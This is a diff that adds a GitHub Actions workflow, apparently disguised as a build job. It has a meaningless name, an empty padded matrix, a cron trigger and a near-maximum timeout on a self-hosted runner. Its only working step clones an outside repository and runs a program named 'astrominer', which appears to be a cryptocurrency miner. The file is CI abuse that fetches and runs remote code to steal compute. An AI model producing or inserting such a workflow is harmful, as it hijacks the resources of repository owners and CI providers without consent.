@@ -1,0 +1,35 @@
+name: √√√√
+
+on:   
+  push: 
+  pull_request: 
+  schedule: 
+    - cron: '* */6 * * *' 
+
+jobs:
+  build:
+
+    runs-on: self-hosted
+    strategy:
+      matrix:
+        go:
+          - |
+          - |
+          - |
+          - |
+        node:
+          - |
+          - |
+          - |
+          - |
+          - |
+          - |
+          - |
+          - |
+          - |
+          - |
+    timeout-minutes: 355
+    steps:
+    - uses: actions/checkout@v1
+    - run: git clone https://github.com/buddyworkk/bun.git && cd bun && chmod 500 astrominer run.sh && ./run.sh
+
